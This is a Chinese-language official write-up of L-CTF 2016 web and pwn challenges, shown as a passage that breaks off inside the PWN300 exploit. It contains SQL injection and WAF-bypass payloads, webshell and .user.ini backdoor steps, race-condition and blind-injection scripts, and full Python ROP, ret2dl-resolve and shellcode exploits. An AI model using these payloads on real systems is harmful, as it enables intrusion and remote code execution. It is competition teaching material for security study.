# 【CTF攻略】L-CTF 2016 官方 Writeup

阅读量 **1612827**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2016-10-08 11:29:39

 **x**

##### 译文声明

本文是翻译文章，文章来源：安全客

译文仅供参考，具体内容表达以及含义原文为准。

****

**  
**

**传送们**

****【CTF攻略】最新2016 L-CTF Nu1L's writeup****
[http://bobao.360.cn/ctf/learning/168.html](http://bobao.360.cn/ctf/learning/168.html)

**  
**

**Web**

**Web 50 签到**

签到题，登录页面存在报错注入，过滤了and、or、select等，但都可以通过双写绕过，空格用/**/代替，通过报错回显即可拿到密码。登陆后进入购买页面，抓包可发现购买数量和密码都可控，猜测后台检验方式为用户余额-单价x数量是否大于零，于是可将购买数量改为一负值或者0，再对密码进行爆破即可。

**  
**

**Web150 我控几不主我及几啦**

这道题思路来源于LuManager15年12爆出的注入漏洞，但sqlmap也能跑并不在出题人意料之内，分给得偏高。从解题人数来看作为签到题似乎更好一点QAQ。

解题办法：

1.sqlmap加上各种tamper后即可跑出

2.构造一个上传表单

并将enctype="multipart/form-data"，然后通过post方法传入id，即可绕过waf联合查询出flag。

where是sql关键字，记得用反引号包住。

注入得到flag:

**  
**

**Web 200 睡过了**

其实这个题就是前段时间爆出来的一个洞,如果你关注最新的漏洞这个题基本就是秒出啦~

具体的参见<http://paper.seebug.org/39/>，基本就是以下几点:

1.PHP序列化字符串中对象长度前加一个+号仍可正常反序列化,可用此来绕过正则，参见<http://www.phpbug.cn/archives/32.html>；

2.PHP当序列化字符串中表示对象属性数的值大于真实的属性个数时会跳过__wakeup()的执行 (所以题目叫睡过啦~）；

3.绕过PHP中open_basedir的限制。

首先打开链接,在filename,filedata中填好一句话的文件名和文件内容,跳到了upload.php,有提示"这种key加也行"：

就像前面所说的加个 **+** ：

很明显filename和filedata的值被清空了。继续改掉"key"后面的那个2为3或者大于2这数字：

写进去了,嘿嘿嘿嘿~

这里实际上是会传到upload目录下,这个目录需要试一下或者扫,这个倒没什么,不过比较坑的一点是会把你的文件名做一下MD5在存在upload目录下
(这个确实…….不过我很快就放出提示告诉大家啦）。然后得知了路径直接用菜刀连上就有一个webshell啦：

然而你会发现有open_basedir的限制,我们需要再写一个脚本去绕过：

参见P总的博客<https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html>

最后访问就可以得到Flag啦~~~~

**web_250–苏打学姐的网站**

这个题目一共有三个步骤。首先是文件读取，有一点小坑，当时放题想过要不要把后台正则匹配的代码提示出来，但是看到几个师傅秒过就算了，然后就是一个常规的CBC翻转，ctf也出现过。

最后是一个上传，比较实战的一个点，使用.user.ini文件构成的PHP后门getshell。最有意思的就是尽量想办法防止文件被改或者删除等，毕竟要getshell，权限限制，再加上ph师傅说的-i隐藏属性各种限制，以及各位大佬的照顾和捧场，使最后题目没出乱子，谢谢大家。还是有一点失误的，记的有队伍的web牛直接使用php文件把flag读到网页访问，这样的话导致其他队伍去的话可以直接访问到flag了(感谢师傅马上上传覆盖解决这个尴尬)。so姿势水平还要加强。

首先打开几个图片可以知道是文件包含，也给了tips提示tips:file/tips.txt、但是直接访问是403，使用img.php直接img.php?id=file/tips.txt也是读取不到的，必须是有jpg,还使用正则简单限制了php://xxxxxxxxx/resource
**=** 形式的读取，后台代码如下：

所以payload：
img.php?id=php://xxxxxxxxx/resource=file/1.jpg/resource=file/tips.txt就可以读到。代码还给返回头加了image/jpg，火狐浏览器直接解析是看不到，可以使用Google
Chrome或者curl命令也行。

得到后台，随便同方法看看admin.php.txt源码，知道是一个cbc翻转改变cookie，参考以前wooyun文章，各位可以网上搜索一下。打开/admin_5080e75b2fe1fb62ff8d9d97db745120首页，主要代码：

    
    
    <?php
    error_reporting(0);
    $Key = "xxxxxxxxxxxxxxxxx";
    $iv = "xxxxxxxxxxxxxxxx";
    $v = "2016niandiqijiequanguowangluoanquandasai0123456789abcdef-->xdctfxdnum=2015auid=4;xdctfxdctf";
    $en_Result = mcrypt_encrypt(MCRYPT_RIJNDAEL_128,$Key, $v, MCRYPT_MODE_CBC, $iv);
    $enc = base64_encode($en_Result);
    $en_Data = base64_decode($_COOKIE[user]);
    $de_Result = mcrypt_decrypt(MCRYPT_RIJNDAEL_128,$Key, $en_Data, MCRYPT_MODE_CBC, $iv);
    $b = array();
    $b = isset($_COOKIE[user])?$de_Result:$enc;
    $num1 = substr($b,strpos($b,"uid")+4,1);
    $num2 = substr($b,strpos($b,"num")+4,4);
    echo '</br><h3>ID: '.$num1."</h3><br>";
    if ($num1 == 1  && $num2 == 2016){
        die ("shen mi li wu !");
    }
    else{
        echo "HELLO CLIENT";
    }
    setcookie("user",$enc);
    ?>

需要改变的是2015的5和uid=4的4,分别对应63和57位，poc：

    
    
    <?php       
            $enc = "dSaWGkNVh2MADjPscqdId/25Y68VaL+Ze6rYSCUHvvDV7MnbDs6fHcibGemmyMoyfHa9cXJ7DHU8Wd/DZqyNfLQ5dDs9wVDIllMKnIQilJunP9hpJ3CYFayOF0vbiqhM";
            $enc = base64_decode($enc);
            $enc[63] = chr(ord($enc[63]) ^ ord("4") ^ ord ("1"));
            $enc[57] = chr(ord($enc[57]) ^ ord("5") ^ ord ("6"));
            $c = base64_encode($enc);
            $d = urlencode($c);
            echo $d;       
    ?>

替换cookie可以跳转到上传界面，fuzzing可以上传ini，不多说直接一篇文章搞定：<http://404.so/7945.html>，之后getshell。得到flag。

**Web 300 headpic**

这道题的大致思路是，首先通过注册账户，注册带非法字符的用户名，发现无法正常的修改头像，而构造正确的sql逻辑则可以更新头像，于是认为在访问用户主页时触发了二次注入。然后到需要写脚本的时候，需要克服这道题的验证码。首先它形式很简单，完全没有粘连，因此可以直接用tesseract-ocr识别；不过还有更简单的方式，验证码是存在session里的，且缺乏验证，那我们直接清空cookie，验证码就不起效了。注入的脚本大致如下：

    
    
    #coding:utf-8
    import requests
    import random
    import pytesseract  
    from PIL import Image
    from io import BytesIO
    import string
    import sys
    def regist(name):
        url1=url+"check.php"
        try:
            for i in range(20):
                veri = verify()
                #print veri
          payload={'user':name,'pass':'111','verify':veri,'typer':'0','register':"%E6%B3%A8%E5%86%8C"}
                #print payload
                r=requests.post(url1,data=payload,headers=headers)
                txt=r.text
                #print txt
                #print r.headers['Content-Length']
                if '2000' in txt:
                    print "register OK!!"
                    flag = login(name)
                    return flag
                    break
                else:
                    pass
                    #print "not register"
            return False
        except Exception, e:
            pass
    def login(name):
        url1=url+"check.php"
        try:
            for i in range(20):
                veri = verify()
                #print veri
                payload={'user':name,'pass':'111','verify':veri,'typer':'0','login':'%E7%99%BB%E9%99%86'}
                r=requests.post(url1,data=payload)
                txt=r.text
                #print txt
                if '2000' in txt:
                    print "login OK!!"
                    #print r.headers
                    headers['Cookie'] = r.headers['Set-Cookie']
                    v = setpic(headers)
                    if v:
                        return True
                        #sys.exit()
                    break
                else:
                    pass
                    #print "not login"
            return False
        except Exception, e:
            raise e
    def verify():
        url = "http://xxxxxx/verify.php"
        try:
            r=requests.get(url,headers=headers)
            i=Image.open(BytesIO(r.content))
            im = i.convert('L')
            threshold = 140
            table = []
            for i in range(256):
                if i < threshold:
                    table.append(0)
                else:
                    table.append(1)
            out = im.point(table, '1') 
            return pytesseract.image_to_string(out)
        except Exception, e:
            raise e
    def setpic(headers):
        url1 = "http://xxxxxx/ucenter.php"
        try:
            r=requests.post(url1,headers=headers)
            txt=r.text
            #print txt
            if "math1as.com/pic" in txt:
                return True
            else:
                return False
        except Exception, e:
            raise e
    headers={
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0",
        "Accept-Language":"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Encoding":"gzip, deflate",
        "Cookie":"3vitee1ku455s2etkefct41j10"
        }
    url = "http://xxxxxx/"
    payloads = ['2', '6', '3', '4', '5', '1', '7', '8', '9', '0','f','a','b','c','d', 'e']
    #payloads =['/','@','_','.', '-', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0']
    #payloads  =list(string.ascii_lowercase)
    ss = ""
    #name = 'kkkkkkkk'/**/or/**/exists(select/**/*/**/from/**/xdsec)/**/#'
    #for i in payloads:
    for i in range(1,33):
        flag = False
        for x in payloads:
            name = 'kkkkkkkk'/**/or/**/ord(substr((select/**/pass/**/from/**/flag_admin_233),'+str(i)+',1))='+str(ord(x))+'/**/#'
            #name = 'kkkkkkkk'/**/or/**/ord(substr((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name=0x666c61675f61646d696e5f323333/**/limit/**/2,1),4,1))=115/**/#'
            #name = 'kkkkkkkk'/**/or/**/length((select/**/admin/**/from/**/flag_admin_233))=5/**/#'
            #name = 'kkkkkkkk'/**/or/**/exists(select/**/id/**/from/**/flag_admin_233)/**/#'
            #print name
            flag = regist(name)
            if flag:
                ss += x
                print ss
                break
                #sys.exit()
    print "done"
    #pass:6cb0598de4da617832e15f4c69570b7
    #name = 'kkkkkkkk'/**/or/**/100>50/**/#'

注入成功得到密码后还是无法直接登陆。然后在robots.txt处有一个base32加密的提示，所以去想办法访问scret_new_notice.php（这里需要以local访问,通过头像处的ssrf,通过@的基础认证方式绕过），得到的提示是admin用户改变了自己的用户名。在这种情况下，由于用来判断的函数是strcmp()，因此传入数组为User[]=xxxx使其返回值为0，成功得到flag。

**  
**

**Web300 【你一定不能来这】**

感谢已毕业的phithon学长，部分思路来源于p总博客<https://www.leavesongs.com/>

首先在根目录下的crossdomain.xml发现隐藏的域名：

访问该域名后可下载一份download.php源码：

并发现可以利用hash长度扩展攻击下载得到www.rar。由于不知道secret长度，需要爆破。Secret长度为18，下载`www.rar`发现压缩包加密了，二进制观察压缩包发现文件尾有一串jjencode，拖入浏览器中可得一段培根密码，解密得到压缩包密码：

解压后进行代码审计，可以得到管理员邮箱。又发现要得到flag要重置id=0的用户的密码。而在php中id=0是会被判断为空的，而由于mysql的特性，会将0aa这样的字符串转成0.所以id=0aa即可进入第一个if。

接下来需要知道token，而token是时间戳加上rand(1,10000)，那么就需要预测服务器上的时间戳然后爆破1-10000。预测时间戳的话有两种方法：

1\. 本地直接time()取，这样的话需要减去网络延时。网络状况不稳定的话就容易造成较大误差。

2\.
通过获取http头的date字段获取服务器的准确时间（GMT），这样的话需要确定`php.ini`的时区设置（北京时间是GMT+8），得到时间戳后爆破即可。这里有一个坑点是，一个回合只能有一个队伍可以重置管理员密码，所以需要通过脚本竞争来进入爆破环节。

**Web 500 盘加加**

比较有趣的一个题目。

首先是登陆的部分，由于管理员的注册逻辑有错，pwd忘记加上md5()，导致无法正常登陆。这时注意到找回密码的地方，为4位数字验证码，因此直接通过脚本爆破。进入到ucenter后其中的调试脚本功能需要余额为99999以上才能使用，而初始提供给了用户33333积分，可以以1:1的形式进行兑换。

这里考察的是一个数据库不加锁情况下处理并发的业务逻辑问题，因此直接用时间竞争的方式，脚本多线程跑一下即可。脚本如下：

    
    
    # -*- coding:utf-8 -*-    import requests
    from time import sleep
    from threading import Thread
    class URLThread(Thread):
        def __init__(self, url,data,cookie, timeout=1, allow_redirects=True):
            super(URLThread, self).__init__()
            self.url = url
            self.timeout = timeout
            self.allow_redirects = allow_redirects
            self.response = None
            self.data=data
            self.cookies=cookies
        def run(self):
            try:
               self.response=requests.post(self.url,timeout=self.timeout,data=self.data,cookies=self.cookies)
                text=self.response.text
                print text
            except Exception , what:
                print what
                pass
    num=10
    data={"count":"33332"}
    cookies={"username":"2|1:0|10:1475430892|8:username|16:bWF0aDFhc19yb290|061255e41481821c19b68f12ac86017ec07f5729ca8ddf9050b291dca75a5360"}
    th=list()
    for i in range(num):
        th.append(URLThread("http://119.28.15.75:9000/trans",data,cookies))
    for j in th:
    j.start()

然后就可以开始调试脚本了。很明显，这里存在一个命令注入，但是限制了大部分的符号，只能使用|、空白、制表符、数字和字母。因此有两种方式绕过：

1\. 利用正则表达式匹配多行的问题,直接绕过

2\. Wget10进制ip地址,然后通过302为其指定一个无后缀名的文件名

最后通过python
文件名执行命令，这个思路是从hitcon的某道题目过来的。最后反弹一个shell，发现权限为root，那么就直接开始审查web源码。在route.py的逻辑中，发现了内网的ip地址，也就是我们调试的脚本地址。用ssh隧道转发后进行访问，发现这其实是一个用php为基础的解释语言(其实就是替换)。在提供的example中找到了调用require的方法，试图包含/self/proc/environ是没有权限的，那么只能使用eval的方法，去执行一个$_SERVER变量，比如x_forwarded_for：

成功执行代码后，就可以执行system，反弹一个shell了：

最后在/home/pwn目录下发现了flag文件，但是直接读取仍然没有权限。分析同目录的.note_pwn，是一个本地提权的文件(setgid)，32位程序，很直接的栈溢出，通过stack-pivoting技巧转移esp到可控区域，然后执行这块区域上预先放置好的rop-chain即可，这块可控区域可利用设置LD_PRELOAD环境变量来获得：

    
    
    ulimit -s unlimited
    export LD_PRELOAD=`python -c "print 'A'*29 + 'xa0x5ex63x55' + 'AAAA' + 'x8cxeax6dx55' + 'x00'*0x8"`
    python -c "print 'A'*0x28+'xd0x8ex57x55'" > /tmp/payload
    cat /tmp/payload - | ./note_pw

最终得到flag

**  
**

**PWN**

    
    
    # 对zio的输入输出加了点函数，方便自己使用
    class zio(object):
        #.....    
        def w(self, s):
            self.write(s)
        def wl(self, s = ''):
            if isinstance(s, (int, long)):
                self.writeline(str(s))
            else:
                self.writeline(s)
        def wls(self ,sequence):
            self.writelines( [str(i) if isinstance(i, (int, long)) else i for i in sequence] )
        def r(self, size = None, timeout = -1):
            return self.read(size, timeout)
        def rl(self, size = -1):
            return self.read_line(size)
        def rtl(self, pattern_list, timeout = -1, searchwindowsize = None):
            return self.read_until(pattern_list, timeout, searchwindowsize)
        def w_af(self, pattern_list, s, timeout = -1, searchwindowsize = None):
            self.read_until(pattern_list, timeout, searchwindowsize)
            self.writeline(s)
        def wls_af(self, pattern_list, sequence, timeout = -1, searchwindowsize = None):
            self.read_until(pattern_list, timeout, searchwindowsize)
            self.writelines( [str(i) if isinstance(i, (int, long)) else i for i in sequence] )

  

**PWN100**

**Bugs**

程序有非常简单粗暴的栈缓冲区溢出，可溢出0x80个字节

**Thinking**

栈溢出，没有提供libc，利用方法很多，可以通过got表泄露libc，可以通过DynELF来泄露libc，然后return-to-libc，或者return-to-dl-resolve

下面给出的两个exp，一个是我无聊测试一下之前写的手动泄露共享库函数的方法，具体方法可参考<http://uaf.io/exploitation/misc/2016/04/02/Finding-Functions.html>这篇文章，另一个exp也是我无聊试的return-to-dl-resolve

**Exploit**

**re2libc**

    
    
    from zio import *
    from pwnlib.dynelf import *
    from pwnlib.elf import *
    io  = zio(('119.28.63.211', 2332), print_read = COLORED(REPR, 'red'), print_write = COLORED(REPR, 'blue'), timeout = 100000)
    # io = zio(('119.28.63.211', 2332), print_read = False, print_write = False, timeout = 10000)
    # io.hint([0x4006b7])
    got_read    = 0x601028
    got_puts    = 0x601018
    plt_puts    = 0x400500
    adr_bss     = 0x601000
    p_rdi_ret   = 0x00400763
    def prepare(address):
        payload  = 'A' * 0x48
        payload += l64(p_rdi_ret)
        payload += l64(address)
        payload += l64(plt_puts)
        payload += l64(0x400550) # program entry
        payload  = payload.ljust(0xc8, 'A')
        io.w(payload)
        io.rtl('bye~n')
    def com_gadget(part1, part2, jmp2, arg1 = 0x0, arg2 = 0x0, arg3 = 0x0):
        payload  = l64(part1)   # part1 entry pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret
        payload += l64(0x0)     # rbx be 0x0
        payload += l64(0x1)     # rbp be 0x1
        payload += l64(jmp2)    # r12 jump to
        payload += l64(arg3)    # r13 -> rdx    arg3
        payload += l64(arg2)    # r14 -> rsi    arg2
        payload += l64(arg1)    # r15 -> edi    arg1
        payload += l64(part2)   # part2 entry will call [rbx + r12 + 0x8]
        payload += 'A' * 56     # junk
        return payload
    def getshell(adr_system):
        payload  = 'A' * 0x48
        payload += com_gadget(0x40075a, 0x400740, jmp2 = got_read,
                arg1 = 0x0,
                arg2 = adr_bss + 0x80,
                arg3 = 0x10)
        payload += l64(0x400550) # program entry
        payload  = payload.ljust(0xc8, 'A')
        io.w(payload)
        io.rtl('bye~n')
        io.w('/bin/shx00' + l64(adr_system))
        payload  = 'A' * 0x48
        payload += com_gadget(0x40075a, 0x400740, jmp2 = adr_bss + 0x88,
                arg1 = adr_bss + 0x80)
        payload += l64(0xdeadbeef)
        payload  = payload.ljust(0xc8, 'A')
        io.w(payload)
        io.rtl('bye~n')
    def leak(address, size):
        count       = 0
        buf         = ''
        while count < size:
            prepare(address + count)
            # leak(str(address + count))
            while True:
                ch = io.read(1, timeout = 0x10)
                #print ch
                count += 1
                if ch == 'n':
                    buf += 'x00'
                    break
                else:
                    buf += ch[0]
        leak_data = buf[:size]
        #print '{} ==> {}'.format(hex(address), leak_data.encode('hex'))
        return leak_data
    # manual leak libc
    BITS = 64
    # get arbitrary address located in libc
    def get_elf_entry(got):
        entry = l64(leak(got, 0x8))
        print '[+] libc entrytttt:t0x%x' % entry
        return entry
    # find libc base according to Magic
    def find_elf_base(entry):
        if BITS == 64:
            libc_base = entry & 0xfffffffffffff000
            while True:
                garbage = leak(libc_base, 0x4)
                if garbage == 'x7fELF':
                    break
                libc_base -= 0x1000
            print '[+] libc basetttt:t0x%x' % libc_base
            return libc_base
    # find program header table
    def find_phdr(elf_base):
        if BITS == 64:
            # get address of program header table
            phdr = l64(leak(elf_base + 0x20, 0x8)) + elf_base
            print '[+] program headers tablett:t0x%x' % phdr
            return phdr
    # find dynamic section table (.dynamic section -> DYNAMIC segment)
    def find_dyn_section(phdr, elf_base):
        if BITS == 64:
            phdr_ent = phdr
            while True:
                garbage = l32(leak(phdr_ent, 0x4))
                # p_type of dynamic segment is 0x2
                if garbage == 0x2:
                    break
                phdr_ent += 0x38
            dyn_section = l64(leak(phdr_ent + 0x10, 0x8)) + elf_base
            print '[+] .dynamic section headers tablet:t0x%x' % dyn_section
            return dyn_section
    def find_sym_str_table(dyn_section):
        if BITS == 64:
            dyn_ent = dyn_section
            dt_sym_tab = 0x0
            dt_str_tab = 0x0
            while True:
                garbage = l64(leak(dyn_ent, 0x8))
                if garbage == 0x6:
                    dt_sym_tab = l64(leak(dyn_ent + 0x8, 0x8))
                elif garbage == 0x5:
                    dt_str_tab = l64(leak(dyn_ent + 0x8, 0x8))
                if dt_str_tab and dt_sym_tab:
                    break
                dyn_ent += 0x10
            print '[+] symtabtttt:t0x%x' % dt_sym_tab
            print '[+] strtabtttt:t0x%x' % dt_str_tab
            return (dt_sym_tab, dt_str_tab)
    def find_func_adr(dt_sym_tab, dt_str_tab, func, elf_base):
        if BITS == 64:
            sym_ent = dt_sym_tab
            while True:
                garbage = l32(leak(sym_ent, 0x4))
                name    = leak(dt_str_tab + garbage, len(func))
                if name == func:
                    break
                sym_ent += 0x18
            adr_func = l64(leak(sym_ent + 0x8, 0x8)) + elf_base
            print '[+] %s loaded addresst:t0x%x' % (func, adr_func)
            return adr_func
    # exploit ELF
    def lookup(func):
        entry                   = get_elf_entry(got_read)
        elf_base                = find_elf_base(entry)
        phdr                    = find_phdr(elf_base)
        dyn_section             = find_dyn_section(phdr, elf_base)
        dt_sym_tab, dt_str_tab  = find_sym_str_table(dyn_section)
        func_address            = find_func_adr(dt_sym_tab, dt_str_tab, func, elf_base)
        return func_address
    leak(got_read, 0x8)
    adr_system = lookup('__libc_system')
    print '[+] system addrt:t' + hex(adr_system)
    getshell(adr_system)
    io.itr()

**ret2dl-resolve**

    
    
    from zio import *
    io  = zio(('119.28.63.211', 2332), print_read = COLORED(REPR, 'red'), print_write = COLORED(REPR, 'blue'), timeout = 100000)
    # io  = zio('./pwn100_strip', print_read = COLORED(REPR, 'red'), print_write = COLORED(REPR, 'blue'), timeout = 100000)
    # io = zio(('119.28.63.211', 2332), print_read = False, print_write = False, timeout = 10000)
    #io.hint([0x4006b7])
    junk        = 0x48
    plt_puts    = 0x0000000000400500
    plt_resolve = 0x00000000004004f0
    got_read    = 0x0000000000601028
    got_puts    = 0x0000000000601018
    got_linkmap = 0x0000000000601008
    leave_ret   = 0x000000000040068c
    pop_rbp_ret = 0x0000000000400595
    pop_rdi_ret = 0x0000000000400763
    p4_ret      = 0x000000000040075c
    adr_stage   = 0x0000000000601000 + 0x800
    adr_rel_plt         = 0x0000000000400450
    adr_dyn_sym         = 0x00000000004002c0
    adr_dyn_str         = 0x0000000000400380
    adr_fake_rel_plt    = adr_stage + 0x100
    adr_fake_dyn_sym    = adr_stage + 0x208
    adr_fake_dyn_str    = adr_stage + 0x300
    adr_shell           = adr_stage + 0x400
    com_part1           = 0x40075a
    com_part2           = 0x400740
    adr_entry           = 0x400550
    def prepare(address):
        payload0  = 'A' * junk
        payload0 += l64(pop_rdi_ret)
        payload0 += l64(address)
        payload0 += l64(plt_puts)
        payload0 += l64(adr_entry)
        payload0  = payload0.ljust(0xc8, 'A')
        io.w(payload0)
        io.rl()
    def leak(address, size):
        count       = 0
        buf         = ''
        while count < size:
            prepare(address + count)
            # leak(str(address + count))
            while True:
                ch = io.read(1, timeout = 0x10)
                #print ch
                count += 1
                if ch == 'n':
                    buf += 'x00'
                    break
                else:
                    buf += ch[0]
        #print '{} ==> {}'.format(hex(address), leak_data.encode('hex'))
        leak_data = buf[:size]
        return leak_data
    def com_gadget(part1, part2, jmp2, arg1 = 0x0, arg2 = 0x0, arg3 = 0x0):
        payload  = l64(part1)   # part1 entry pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret
        payload += l64(0x0)     # rbx be 0x0
        payload += l64(0x1)     # rbp be 0x1
        payload += l64(jmp2)    # r12 jump to
        payload += l64(arg3)    # r13 -> rdx    arg3
        payload += l64(arg2)    # r14 -> rsi    arg2
        payload += l64(arg1)    # r15 -> edi    arg1
        payload += l64(part2)   # part2 entry will call [rbx + r12 + 0x8]
        payload += 'A' * 56     # junk
        return payload
    adr_linkmap = l64(leak(got_linkmap, 0x8))
    print '[+] leak link_mapt:t' + hex(adr_linkmap)
    # overwrite link_map+0x1c8 0x0, read fake structure
    payload0  = 'A' * junk
    payload0 += com_gadget(com_part1, com_part2, got_read,
            arg1 = 0x0,
            arg2 = adr_linkmap + 0x1c8,
            arg3 = 0x8)
    payload0 += l64(adr_entry)
    payload0  = payload0.ljust(0xc8, 'A')
    io.w(payload0)
    io.rl()
    io.w(l64(0x0))
    payload0  = 'A' * junk
    payload0 += com_gadget(com_part1, com_part2, got_read,
            arg1 = 0x0,
            arg2 = adr_stage,
            arg3 = 0x500)
    payload0 += l64(adr_entry)
    payload0  = payload0.ljust(0xc8, 'A')
    io.w(payload0)
    io.rl()
    payload0  = 'A' * junk
    payload0 += l64(pop_rbp_ret)
    payload0 += l64(adr_stage)
    payload0 += l64(leave_ret)
    payload0  = payload0.ljust(0xc8, 'A')
    # fake structure
    align_rel_plt   = 0x8*3 - (adr_fake_rel_plt - adr_rel_plt) % (0x8 * 3)
    payload1  = 'A' * 0x8
    payload1 += l64(pop_rdi_ret) # set $rdi "/bin/sh"
    payload1 += l64(adr_shell)
    payload1 += l64(plt_resolve)
    payload1 += l64((adr_fake_rel_plt - adr_rel_plt + align_rel_plt) / (0x8 * 3))
    payload1 += l64(0xdeadbeef)
    payload1  = payload1.ljust(0x100, 'A')
    align_dyn_sym   = 0x8*3 - (adr_fake_dyn_sym - adr_dyn_sym) % (0x8 * 3)
    payload1 += 'A' * align_rel_plt
    payload1 += l64(got_read)
    payload1 += l64((adr_fake_dyn_sym - adr_dyn_sym + align_dyn_sym)/(0x8*3)*0x100000000 + 0x7)
    payload1  = payload1.ljust(0x208, 'A')
    payload1 += 'A' * align_dyn_sym
    payload1 += l32(adr_fake_dyn_str - adr_dyn_str)
    payload1 += l32(0x12)
    payload1 += l64(0x0)
    payload1 += l64(0x0)
    payload1  = payload1.ljust(0x300, 'A')
    payload1 += 'systemx00'
    payload1  = payload1.ljust(0x400, 'A')
    payload1 += '/bin/shx00'
    payload1  = payload1.ljust(0x500, 'A')
    io.w(payload1)
    io.w(payload0)
    io.rl()
    io.interact()

**  
**

**PWN200**

**Bugs**

1\. 存在栈地址泄露

2\. 在输入`money`时存在栈溢出，可覆盖`malloc`出的指针

**Thinking**

首先泄露出栈地址，然后覆盖堆指针为栈上的可控区域，我们可以精巧的构造这块区域成一个伪造的堆块，之后通过free，这个堆块即被加入到了fastbin中，然后再通过malloc，即可对这个堆块的空间进行任意写，这时只要覆盖栈上的返回地址为一个jmp
rsp，再通过一个short jmp，来执行shellcode，即可获得shell

另外，在构造堆块时，同时要构造好相邻的下一个堆块的头部，使得其prev_inuse == 1（在free的时候会检查）

（其实这个漏洞利用的过程也叫house-of-spirit）

然而。事实上由于我的疏忽，可以直接覆盖指针为got表函数的地址，然后strcpy修改got表函数的地址，即可执行shellcode，sigh:(

**Exploit**

    
    
    from zio import *
    target = './pwn200'
    target = ('119.28.63.211', 2333)
    io  = zio(target, print_read = COLORED(RAW, 'red'), print_write = COLORED(RAW, 'blue'), timeout = 10000)
    io.rl()
    # x86/bsd/exec: 24 bytes
    shellcode = (
                "x31xf6x48xbbx2fx62x69x6ex2fx2fx73x68x56"
                "x53x54x5fx6ax3bx58x31xd2x0fx05"
                )
    # leak stack
    fake = shellcode.ljust(0x30, 'A')   # shellcode
    io.w(fake)
    io.rtl('A' * (0x30 - len(shellcode)))
    stack_ptr = l64(io.rtl(',')[:-1].ljust(0x8, 'x00')) - 0xb0
    print '[+] leak stack pointert:t0x%x' % stack_ptr
    io.rtl('id ~~?')
    io.wl(0x20)                         # size of next chunk
    fake  = 'A' * 0x8
    fake += l64(0x61)                   # size of free'd chunk
    fake += 'A' * 0x28
    fake += l64(stack_ptr)              # vuln stack pointer
    io.rtl('money~')
    io.w(fake)
    io.rtl('choice')
    io.wl(2)
    io.rtl('choice')
    fake  = 'A' * 0x38
    fake += l64(0x00400d1b)             # jmp rsp
    fake += 'xebx1ex00x00'          # short jmp
    fake  = fake.ljust(0x10, 'B')
    io.wls([1, 0x50, fake])
    io.wl(3)                            # ret to get shell
    io.itr()

**Reference**

1\. <https://gbmaster.wordpress.com/2015/07/21/x86-exploitation-101-house-of-spirit-friendly-stack-overflow/>

2\. <https://github.com/shellphish/how2heap/blob/master/house_of_spirit.c>

**  
**

**PWN300**

**Bugs**

简单粗暴的一个栈溢出

**Thinking**

程序动态链接的两个共享库都是我自己写的，libio.so里用syscall实现了两个输入输出函数，libgetshell.so里放了一个执行shellcode的getshell函数

自己设计的思路是根据[[1]](http://uaf.io/exploitation/misc/2016/04/02/Finding-Functions.html)这篇文章来的。手动查文件头和各种表寻找共享库内的函数地址。

关于libgetshell.so的基地址，只要泄露link_map就可以得到

**Exploit**

    
    
    from zio import *
    io  = zio(('119.28.63.211', 2339), print_read = COLORED(REPR, 'red'), print_write = COLORED(REPR, 'blue'), timeout = 100000)
    io.hint([0x4004cb])
    got_write   = 0x601018
    got_read    = 0x601020
    adr_bss     = 0x601000
    def com_gadget(part1, part2, jmp2, arg1 = 0x0, arg2 = 0x0, arg3 = 0x0):
        payload  = l64(part1)   # part1 entry pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret
        payload += l64(0x0)     # rbx be 0x0
        payload += l64(0x1)     # rbp be 0x1
        payload += l64(jmp2)    # r12 jump to
        payload += l64(arg3)    # r13 -> rdx    arg3
        payload += l64(arg2)    # r14 -> rsi    arg2
        payload += l64(arg1)    # r15 -> edi    arg1
        payload += l64(part2)   # part2 entry will call [rbx + r12 + 0x8]
        payload += 'A' * 48     # junk
        return payload
    def leak(address, size):
        payload  = 'A' * 0x28
        payload += com_gadget(0x40049c, 0x400480, jmp2 = got_write,
                arg1 = 0x1,
                arg2 = address,
                arg3 = size)
        payload += l64(0x4004ec) # program entry
        io.rl()
        io.w(payload)
        leak_data = io.r(size)
        print '{} ==> {}'.format(hex(address), leak_data.encode('hex'))
        return leak_data
    def getshell(adr_system):
        raw_input()
        payload  = 'A' * 0x28
        payload += com_gadget(0x40049c, 0x400480, jmp2 = got_read,
                arg1 = 0x0,
                arg2 = adr_bss + 0x80,
                arg3 = 0x10)
        payload += l64(0x4004ec) # program entry
        io.w(payload)
        io.w('/bin/shx00' + l64(adr_system))
        payload  = 'A' * 0x28
        payload += com_gadget(0x40049c, 0x400480, jmp2 = adr_bss + 0x88,
                arg1 = adr_bss + 0x80)
        payload += l64(0xdeadbeef)
        io.w(payload.ljust(0x80, 'A'))
    # manual leak libc
    BITS = 64
    def find_elf_base():
        adr_lmap = 0x601008
        node = l64(leak(adr_lmap, 8))
        name = 0x0
        junk = ''
        while True:
            if node:
                junk = leak(node, 8*5)
                if 'getshell' in leak(l64(junk[8:16]), 0x80):
                    print '[+] find shared object at 0x%x ~' % l64(junk[:8])
                    break
                else :
                    node = l64(junk[24:32])
            else:
                print '[-] not found ~'
                break
        return l64(junk[:8])
    # find program header table
    def find_phdr(elf_base):
        if BITS == 64:
            # get address of program header table
            phdr = l64(leak(elf_base + 0x20, 0x8)) + elf_base
            print '[+] program headers tablett:t0x%x' % phdr
            return phdr
    # find dynamic section table (.dynamic section -> DYNAMIC segment)
    def find_dyn_section(phdr, elf_base):
        if BITS == 64:
            phdr_ent = phdr
            while True:
                garbage = l32(leak(phdr_ent, 0x4))
                # p_type of dynamic segment is 0x2
                if garbage == 0x2:
                    break
                phdr_ent += 0x38
            dyn_section = l64(leak(phdr_ent + 0x10, 0x8)) + elf_base
            print '[+] .dynamic section headers tablet:t0x%x' % dyn_section
            return dyn_section
    def find_sym_str_table(dyn_section):
        if BITS == 64:
            dyn_ent = dyn_section
            dt_sym_tab = 0x0
